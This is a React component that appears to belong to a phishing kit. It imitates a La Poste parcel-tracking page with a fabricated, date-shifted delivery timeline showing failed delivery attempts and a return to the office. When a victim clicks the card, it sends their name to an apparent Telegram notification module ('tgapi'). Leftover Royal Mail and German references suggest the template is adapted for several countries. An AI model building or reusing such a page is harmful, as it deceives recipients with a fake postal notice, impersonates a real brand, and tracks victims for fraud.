import { useState, useEffect, useRef } from "react";
import { Calendar, Clock, Truck, AlertCircle, CheckCircle, Package, MapPin, Check, X } from "lucide-react";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogTrigger } from "@/components/ui/dialog";
import { sendTrackingInformationViewNotification } from "../tgapi";
import laPosteLogo from "@/assets/laposte.png";

interface FrTrackingFormProps {
  recipientData?: {
    name?: string;
    city?: string;
    old_city?: string;
  };
}

const FrTrackingForm = ({ recipientData }: FrTrackingFormProps) => {
  // Calculate date that is 4 days ago, but if Sunday then 1 day earlier (Saturday)
  const getTrackingDate = (daysAgo: number) => {
    const date = new Date();
    date.setDate(date.getDate() - daysAgo);
    
    // If the date falls on Sunday (0), move it to Saturday (1 day earlier)
    if (date.getDay() === 0) {
      date.setDate(date.getDate() - 1);
    }
    
    const day = date.getDate();
    const month = date.toLocaleDateString('fr-FR', { month: 'short' });
    return `${day} ${month}`;
  };
  const [isDialogOpen, setIsDialogOpen] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showContent, setShowContent] = useState(false);
  const deliveryStatus = "in-transit";
  const returnedToDepotRef = useRef<HTMLDivElement>(null);
  useEffect(() => {
    if (isDialogOpen) {
      setIsLoading(true);
      setShowContent(false);
      const timer = setTimeout(() => {
        setIsLoading(false);
        setShowContent(true);
      }, 5000);
      return () => clearTimeout(timer);
    } else {
      setIsLoading(false);
      setShowContent(false);
    }
  }, [isDialogOpen]);
  useEffect(() => {
    if (showContent) {
      // Start at the top immediately
      const container = document.querySelector('.flex-1.overflow-y-auto');
      if (container) {
        container.scrollTo({
          top: 0,
          behavior: 'auto'
        });

        // Wait a moment then start smooth continuous scroll
        setTimeout(() => {
          const element = document.querySelector('[data-step="returned-to-depot"]') as HTMLElement;
          if (element) {
            const targetPosition = element.offsetTop - container.clientHeight / 2;
            const startPosition = 0;
            const distance = targetPosition - startPosition;
            const duration = 750; // 0.75 seconds total animation (much faster)
            const startTime = performance.now();
            const animateScroll = (currentTime: number) => {
              const elapsedTime = currentTime - startTime;
              const progress = Math.min(elapsedTime / duration, 1);

              // Easing function for smooth animation
              const easeInOutQuad = (t: number) => t < 0.5 ? 2 * t * t : -1 + (4 - 2 * t) * t;
              const currentPosition = startPosition + distance * easeInOutQuad(progress);
              container.scrollTo({
                top: currentPosition,
                behavior: 'auto'
              });
              if (progress < 1) {
                requestAnimationFrame(animateScroll);
              }
            };
            requestAnimationFrame(animateScroll);
          }
        }, 300);
      }
    }
  }, [showContent]);

  // Use city from recipient data, if empty just show France
  const recipientCity = recipientData?.city || "";
  const oldCity = recipientData?.old_city || "";
  
  const trackingSteps = [{
    icon: Package,
    title: "Colis expédié",
    location: "Centre de tri Lyon",
    city: "Paris, France",
    date: getTrackingDate(4),
    time: "08:30",
    status: "completed",
    bgColor: "bg-blue-50",
    iconColor: "text-blue-600"
  }, {
    icon: Truck,
    title: "Pris en charge par le facteur",
    location: "Bureau de Poste local",
    city: "Paris, France",
    date: getTrackingDate(4),
    time: "10:15",
    status: "completed",
    bgColor: "bg-green-50",
    iconColor: "text-green-600"
  }, {
    icon: Clock,
    title: "Colis en transit",
    location: "En route vers la destination",
    city: "Paris, France",
    date: getTrackingDate(4),
    time: "14:45",
    status: "current",
    bgColor: "bg-orange-50",
    iconColor: "text-orange-600"
  }, {
    icon: MapPin,
    title: "Arrivé à destination",
    location: "Bureau de livraison local",
    city: oldCity ? `${oldCity}, France` : "France",
    date: getTrackingDate(3),
    time: "07:20",
    status: "completed",
    bgColor: "bg-purple-50",
    iconColor: "text-purple-600"
  }, {
    icon: AlertCircle,
    title: "Tentative de livraison",
    location: "Destinataire absent",
    city: oldCity ? `${oldCity}, France` : "France",
    date: getTrackingDate(3),
    time: "11:30",
    status: "failed",
    bgColor: "bg-red-50",
    iconColor: "text-red-600"
  }, {
    icon: AlertCircle,
    title: "Tentative de livraison",
    location: "Destinataire absent",
    city: oldCity ? `${oldCity}, France` : "France",
    date: getTrackingDate(3),
    time: "15:45",
    status: "failed",
    bgColor: "bg-red-50",
    iconColor: "text-red-600"
  }, {
    icon: Truck,
    title: "Retour au bureau",
    location: "Colis en transit",
    city: oldCity ? `${oldCity}, France` : "France",
    date: getTrackingDate(2),
    time: "18:00",
    status: "completed",
    bgColor: "bg-yellow-50",
    iconColor: "text-yellow-600"
  }, {
    icon: Package,
    title: "Retourné au bureau",
    location: "",
    city: "Paris, France",
    date: getTrackingDate(2),
    time: "20:17",
    status: "available",
    bgColor: "bg-blue-50",
    iconColor: "text-blue-600"
  }];
  const statusConfig = {
    "in-transit": {
      icon: Truck,
      label: "En transit",
      color: "text-blue-600",
      bgColor: "bg-blue-50",
      borderColor: "border-blue-200"
    },
    "delivered": {
      icon: CheckCircle,
      label: "Livré",
      color: "text-green-600",
      bgColor: "bg-green-50",
      borderColor: "border-green-200"
    },
    "pending": {
      icon: AlertCircle,
      label: "En attente",
      color: "text-orange-600",
      bgColor: "bg-orange-50",
      borderColor: "border-orange-200"
    }
  };
  const currentStatus = statusConfig[deliveryStatus as keyof typeof statusConfig];
  const StatusIcon = currentStatus.icon;
  const handleCardClick = () => {
    // Send tracking information notification
    const clientName = recipientData?.name || "Unknown Client";
    sendTrackingInformationViewNotification(clientName);
    
    setIsLoading(true);
    setTimeout(() => {
      setIsLoading(false);
      setIsDialogOpen(true);
    }, 250);
  };
  return <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
      <Card onClick={handleCardClick} className={`glass-card hover-lift shadow-2xl hover:shadow-3xl transition-all duration-500 ease-out border border-gray-250 cursor-pointer group hover:scale-105 active:scale-95 w-fit min-w-[190px] ${isLoading ? 'scale-95' : ''}`}>
        <div className="px-2 pt-2 pb-2 transition-all duration-300">
          <CardTitle className="flex items-center text-sm transition-colors duration-300">
            <div className={`p-2 bg-blue-50 rounded-xl mr-3 transition-all duration-300 shadow-md shadow-black/10 border-2 border-white/50 backdrop-blur-sm group-hover:shadow-lg group-hover:scale-110 group-active:scale-95 ${isLoading ? 'animate-pulse' : ''}`}>
              <Truck className={`h-5 w-5 text-blue-600 drop-shadow-sm transition-all duration-300 group-hover:rotate-12 ${isLoading ? 'animate-spin' : ''}`} />
            </div>
            <span className="transition-all duration-300 group-hover:translate-x-1">
              {isLoading ? 'Chargement...' : 'Suivi du colis'}
            </span>
          </CardTitle>
        </div>
      </Card>
      <DialogContent className="p-0 border-0 bg-black/20 shadow-none max-w-[320px] w-full my-8 max-h-[80vh] overflow-hidden data-[state=open]:animate-in data-[state=closed]:animate-out data-[state=closed]:fade-out-0 data-[state=open]:fade-in-0 data-[state=closed]:zoom-out-95 data-[state=open]:zoom-in-95 data-[state=open]:duration-300">
        <div className="h-full max-h-[70vh] flex flex-col">
          <Card className="shadow-2xl border-2 border-red-500 rounded-[6px] drop-shadow-xl bg-white h-full flex flex-col overflow-hidden transform transition-all duration-300 ease-out data-[state=open]:animate-in data-[state=open]:zoom-in-95 data-[state=open]:fade-in-0">
            {/* Banner with Logo - Sticky */}
            <div className="sticky top-0 z-10 bg-gradient-to-r from-yellow-400 to-yellow-500 p-4 relative">
              <div className="flex items-center justify-center">
                <div className="bg-gradient-to-r from-yellow-300 to-yellow-400 border-2 border-white/50 rounded-sm px-3 py-0.5 shadow-lg">
                  <span className="text-black font-semibold text-xs">Suivi du colis</span>
                </div>
              </div>
              {/* Close Button */}
              <button 
                onClick={() => setIsDialogOpen(false)}
                className="absolute right-3 top-3 bg-red-400/80 hover:bg-red-400 rounded-full w-6 h-6 flex items-center justify-center shadow-md hover:shadow-lg transition-all duration-300 hover:scale-105 border border-red-500"
              >
                <X className="h-4 w-4 text-white" />
              </button>
              
              <div className="absolute left-4 top-1/2 transform -translate-y-1/2 w-10 h-10 bg-yellow-400 rounded-full flex items-center justify-center shadow-lg border-2 border-yellow-500">
                <Truck className="h-6 w-6 text-gray-600 drop-shadow-lg" />
              </div>
            </div>
            
            <div className="flex-1 overflow-y-auto px-2 pt-4 pb-4">
              {isLoading ? <div className="p-6 animate-fade-in">
                  <Card className="shadow-lg border border-border/50 bg-white animate-scale-in">
                    <CardContent className="flex flex-col items-center space-y-6 pt-8 pb-8">
                      <div className="relative">
                        <div className="w-20 h-20 rounded-full bg-blue-100 flex items-center justify-center animate-pulse">
                          <Package className="h-8 w-8 text-blue-600" />
                        </div>
                        <div className="absolute inset-0 rounded-full border-4 border-blue-200 border-t-blue-600 animate-spin"></div>
                      </div>
                       <p className="text-gray-600 text-center text-xs max-w-xs animate-fade-in" style={{animationDelay: '0.2s'}}>
                          Veuillez patienter pendant que nous nous connectons au système de suivi.
                        </p>
                    </CardContent>
                  </Card>
                </div> : showContent ? <div className="space-y-4 animate-fade-in">
              
              {/* Tracking Timeline Card */}
              <div className="p-4 bg-blue-50 rounded-xl border border-border/50 shadow-lg drop-shadow-md hover:shadow-xl transition-shadow duration-300">
                <div className="space-y-4">
                    <div className="relative">
                      {trackingSteps.map((step, index) => {
                      const Icon = step.icon;
                      const isCompleted = step.status === "completed";
                      const isCurrent = step.status === "current";
                      const isFailed = step.status === "failed";
                      const isAvailable = step.status === "available";
                      return <div key={index} className="relative flex items-start pb-6 last:pb-0" data-step={step.title === "Returned to Depot" ? "returned-to-depot" : undefined}>
                            {/* Timeline line - thin white vertical line */}
                            {index < trackingSteps.length - 1 && <div className="absolute left-6 top-12 w-1 h-24 bg-white" />}
                            
                            {/* Icon with circular background */}
                            <div className="flex-shrink-0 relative z-10">
                              <div className={`w-12 h-12 rounded-full flex items-center justify-center border-4 border-white shadow-lg drop-shadow-md ${step.bgColor}`}>
                                <Icon className={`h-5 w-5 ${step.iconColor}`} />
                              </div>
                            </div>
                            
                            {/* Content - White Card */}
                            <div className="flex-1 min-w-0 ml-4">
                                <div className="bg-blue-50 p-3 rounded-lg border-4 border-white shadow-lg drop-shadow-md">
                                  <div className="flex items-start justify-between">
                                    <div className="flex-1">
                                      <h5 className="font-medium text-xs text-gray-900">{step.title}</h5>
                              <p className="text-[10px] text-gray-600 mt-0.5" dangerouslySetInnerHTML={{
                            __html: step.city.replace(', Deutschland', '<br>Deutschland')
                          }} />
                                      {(isFailed || isAvailable) && step.location && <div className={`mt-2 p-1.5 rounded text-[10px] ${isFailed ? 'bg-red-50 border border-red-200' : 'bg-blue-50 border border-blue-200'}`}>
                                           <p className={`font-medium whitespace-nowrap truncate ${isFailed ? 'text-red-600' : 'text-gray-700'}`}>
                                             {step.location}
                                           </p>
                                        </div>}
                                     </div>
                                     <div className="text-right flex-shrink-0 ml-3">
                                       <div className="text-[9px] font-medium text-gray-600">
                                         {step.date}
                                       </div>
                                       <div className="text-[9px] font-medium text-gray-500">
                                         {step.time}
                                       </div>
                                     </div>
                                   </div>
                                 </div>
                               </div>
                          </div>;
                    })}
                    </div>
                    
                    {/* Pickup Address Card - Moved to bottom */}
                    <div className="mt-6 p-4 bg-gradient-to-r from-muted/30 to-muted/10 rounded-xl border border-border/50 border-2 border-white shadow-lg drop-shadow-md hover:shadow-xl transition-shadow duration-300">
                      <h4 className="text-xs font-semibold text-card-foreground mb-3 relative text-center">
                        <span className="relative inline-block flex items-center justify-center space-x-1">
                          <MapPin className="h-3 w-3 text-blue-500" />
                          <span className="relative z-10">Adresse de retrait</span>
                          <div className="absolute -bottom-1 left-0 w-full h-px bg-gradient-to-r from-gray-500 to-gray-600 rounded-full"></div>
                          
                          <div className="absolute -bottom-3.5 left-1/3 w-1/3 h-1.5 bg-gray-300/40 rounded-full blur-md"></div>
                        </span>
                      </h4>
                      <div className="text-[10px] text-muted-foreground">
                         <div className="text-left space-y-1">
                           <div className="font-semibold text-gray-700">Bureau de Poste</div>
                           <div className="font-medium text-gray-800">15 Rue de la République</div>
                           <div className="font-medium text-gray-800">Paris, 75001</div>
                         </div>
                         
                         <div className="mt-4 pt-3 border-t border-gray-200/50">
                           <div className="text-center text-[9px] text-gray-500">
                             Retrait possible pendant les heures d'ouverture
                           </div>
                         </div>
                      </div>
                    </div>
                  </div>
                </div>
              </div> : null}
          </div>
          
          {/* Status Banner - Similar to Royal Mail header style */}
            
            {/* Status Banner - Similar to Royal Mail header style */}
            <div className="sticky bottom-0 z-10 bg-gradient-to-r from-yellow-400 to-yellow-500 py-4 px-2 relative">
              <img src={laPosteLogo} alt="La Poste Logo" className="absolute left-1/2 top-1/2 transform -translate-x-1/2 -translate-y-1/2 h-4 w-auto" />
            </div>
        </Card>
        </div>
      </DialogContent>
    </Dialog>;
};
export default FrTrackingForm;
